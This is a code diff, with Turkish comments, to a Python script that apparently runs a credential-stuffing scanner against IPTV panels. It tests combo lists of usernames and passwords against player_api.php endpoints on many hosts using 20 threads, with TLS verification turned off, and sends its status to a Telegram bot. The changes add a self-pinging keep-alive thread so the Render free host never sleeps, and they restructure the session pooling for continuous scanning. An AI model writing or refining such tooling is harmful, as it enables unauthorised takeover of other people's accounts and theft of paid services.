@@ -24,10 +24,8 @@ def telegrama_gonder(mesaj):
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
         res = requests.post(url, data=data, timeout=10)
-        
-        # Telegram yanıtını kontrol edelim (Spam veya hata varsa konsola yazdırsın)
         if res.status_code != 200:
-            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
+            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}")
         else:
             print("[+] Telegram bildirimi başarıyla gönderildi.")
     except Exception as e:
@@ -44,13 +42,21 @@ HEADERd = {
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Optimize edilmiş session
-session = requests.Session()
-adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
-session.mount('http://', adapter)
-session.mount('https://', adapter)
+# Render'ın uykuya almasını engellemek için Keep-Alive (Self-Ping) fonksiyonu
+def render_uynik_tutucu():
+    time.sleep(10) # Flask tamamen ayağa kalkana kadar biraz bekle
+    app_url = os.environ.get('RENDER_EXTERNAL_URL')
+    if app_url:
+        print(f"[*] Render Keep-Alive Aktif! Hedef URL: {app_url}")
+        while True:
+            try:
+                requests.get(app_url, timeout=10)
+                print("[keep-alive] Sistem uyanık tutuluyor...")
+            except:
+                pass
+            time.sleep(300) # Her 5 dakikada bir kendine istek at
 
-def m3u_tara_detayli(panel, user, pas):
+def m3u_tara_detayli(session, panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
         res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
@@ -126,7 +132,7 @@ def m3u_tara_detayli(panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Keep-Alive Uyandırma Modu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -169,20 +175,26 @@ def arka_plan_tarayici():
                         chunk_size = 1000
                         toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                         
-                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
-                            chunk = combolar[i:i + chunk_size]
-                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
+                        # Her turda temiz bir session havuzu açıp kapatarak bellek/soket şişmesini önleyelim
+                        with requests.Session() as session:
+                            adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
+                            session.mount('http://', adapter)
+                            session.mount('https://', adapter)
                             
-                            with ThreadPoolExecutor(max_workers=20) as executor:
-                                futures = [
-                                    executor.submit(m3u_tara_detayli, panel, user, pas)
-                                    for user, pas in chunk
-                                    for panel in paneller
-                                ]
-                                for future in as_completed(futures):
-                                    pass
-                            
-                            time.sleep(0.5)
+                            for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
+                                chunk = combolar[i:i + chunk_size]
+                                print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
+                                
+                                with ThreadPoolExecutor(max_workers=20) as executor:
+                                    futures = [
+                                        executor.submit(m3u_tara_detayli, session, panel, user, pas)
+                                        for user, pas in chunk
+                                        for panel in paneller
+                                    ]
+                                    for future in as_completed(futures):
+                                        pass
+                                
+                                time.sleep(0.5)
         
             print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
             time.sleep(600)
@@ -192,9 +204,16 @@ def arka_plan_tarayici():
 
 if __name__ == '__main__':
     import threading
-    t = threading.Thread(target=arka_plan_tarayici)
-    t.daemon = True
-    t.start()
+    
+    # 1. Tarayıcı thread'i
+    t_tarayici = threading.Thread(target=arka_plan_tarayici)
+    t_tarayici.daemon = True
+    t_tarayici.start()
+    
+    # 2. Render'ı uykudan koruyan keep-alive thread'i
+    t_keepalive = threading.Thread(target=render_uynik_tutucu)
+    t_keepalive.daemon = True
+    t_keepalive.start()
     
     print("[*] Flask Web Sunucusu Başlatılıyor...")
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
